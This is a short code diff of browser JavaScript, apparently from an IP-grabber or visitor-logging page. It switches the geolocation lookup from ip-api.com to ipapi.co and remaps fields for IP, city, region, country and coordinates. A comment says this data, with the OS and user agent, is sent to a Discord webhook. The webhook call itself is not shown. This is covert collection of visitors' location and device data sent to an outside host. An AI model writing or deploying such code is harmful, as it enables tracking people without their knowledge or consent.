@@ -123,14 +123,14 @@
         }
 
         // Send the user information to Discord webhook as an Embed
-        fetch('https://ip-api.com/json')
+        fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
-                const ip = data.query;
+                const ip = data.ip;
                 const city = data.city;
-                const region = data.regionName;
-                const country = data.country;
-                const loc = data.lat + ',' + data.lon; // Latitude, Longitude
+                const region = data.region;
+                const country = data.country_name;
+                const loc = data.latitude + ',' + data.longitude; // Latitude, Longitude
 
                 const os = getOS();
                 const browser = navigator.userAgent;
